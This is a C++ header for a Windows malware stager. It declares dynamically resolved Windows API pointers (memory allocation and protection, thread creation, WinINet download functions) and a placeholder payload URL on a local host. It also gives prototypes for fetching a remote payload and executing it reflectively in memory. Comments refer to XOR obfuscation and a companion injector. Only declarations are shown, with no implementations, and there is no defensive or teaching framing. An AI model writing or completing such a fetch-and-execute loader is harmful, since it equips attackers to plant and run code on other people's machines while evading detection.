#ifndef STAGER_H
#define STAGER_H

// Includes for Windows API
#include <windows.h>
#include <wininet.h> // For Internet functions
#include <vector>    // For dynamic buffer
#include <string>    // For obfuscation helper

// --- XOR Obfuscation --- (Copy from injector or recreate)
// We'll define the macro and helper in stager.cpp for simplicity

// --- Function Pointer Typedefs ---
typedef HMODULE (WINAPI* LoadLibraryA_t)(LPCSTR lpLibFileName);
typedef FARPROC (WINAPI* GetProcAddress_t)(HMODULE hModule, LPCSTR lpProcName);
typedef BOOL (WINAPI* FreeLibrary_t)(HMODULE hLibModule);
typedef LPVOID (WINAPI* VirtualAlloc_t)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef BOOL (WINAPI* VirtualFree_t)(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
typedef BOOL (WINAPI* VirtualProtect_t)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
typedef HANDLE (WINAPI* CreateThread_t)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
typedef VOID (WINAPI* Sleep_t)(DWORD dwMilliseconds);
typedef VOID (WINAPI* OutputDebugStringA_t)(LPCSTR lpOutputString);
typedef DWORD (WINAPI* GetLastError_t)(void);
typedef HMODULE (WINAPI* GetModuleHandleW_t)(LPCWSTR lpModuleName);

// WinINet functions
typedef HINTERNET (WINAPI* InternetOpenW_t)(LPCWSTR lpszAgent, DWORD dwAccessType, LPCWSTR lpszProxy, LPCWSTR lpszProxyBypass, DWORD dwFlags);
typedef HINTERNET (WINAPI* InternetOpenUrlW_t)(HINTERNET hInternet, LPCWSTR lpszUrl, LPCWSTR lpszHeaders, DWORD dwHeadersLength, DWORD dwFlags, DWORD_PTR dwContext);
typedef BOOL (WINAPI* InternetReadFile_t)(HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead);
typedef BOOL (WINAPI* InternetCloseHandle_t)(HINTERNET hInternet);
typedef BOOL (WINAPI* HttpQueryInfoW_t)(HINTERNET hRequest, DWORD dwInfoLevel, LPVOID lpBuffer, LPDWORD lpdwBufferLength, LPDWORD lpdwIndex);

// CRT functions (potentially from kernel32 or msvcrt, need to load dynamically)
typedef int (__cdecl* strcmp_t)(const char* _Str1, const char* _Str2);
typedef void* (__cdecl* memcpy_t)(void* _Dst, const void* _Src, size_t _Size);
// wsprintfA is often in user32, but let's try kernel32 first
typedef int (WINAPIV* wsprintfA_t)(LPSTR, LPCSTR, ...);


// --- API Pointer Structure ---
typedef struct {
    LoadLibraryA_t RealLoadLibraryA;
    GetProcAddress_t RealGetProcAddress;
    FreeLibrary_t RealFreeLibrary;
    VirtualAlloc_t RealVirtualAlloc;
    VirtualFree_t RealVirtualFree;
    VirtualProtect_t RealVirtualProtect;
    CreateThread_t RealCreateThread;
    Sleep_t RealSleep;
    OutputDebugStringA_t RealOutputDebugStringA;
    GetLastError_t RealGetLastError;
    GetModuleHandleW_t RealGetModuleHandleW;

    // WinINet
    InternetOpenW_t RealInternetOpenW;
    InternetOpenUrlW_t RealInternetOpenUrlW;
    InternetReadFile_t RealInternetReadFile;
    InternetCloseHandle_t RealInternetCloseHandle;
    HttpQueryInfoW_t RealHttpQueryInfoW;

    // CRT
    strcmp_t Real_strcmp;
    memcpy_t Real_memcpy;
    wsprintfA_t Real_wsprintfA;

} StagerApiPointers;

// Global variable to hold the pointers (defined in stager.cpp)
extern StagerApiPointers g_api;

// --- Basic configuration or constants ---
#define PAYLOAD_URL L"http://127.0.0.1:8080/payload.bin" // Placeholder URL (WCHAR for WinAPI)

// Function prototypes for stager logic
bool InitializeStagerApiPointers(); // Initialization function
bool FetchPayload(LPCWSTR url, std::vector<BYTE>& payloadData);
bool ExecutePayloadReflective(const std::vector<BYTE>& payloadData);
// Example: bool ExecutePayload(BYTE* payloadData, DWORD payloadSize);

#endif // STAGER_H 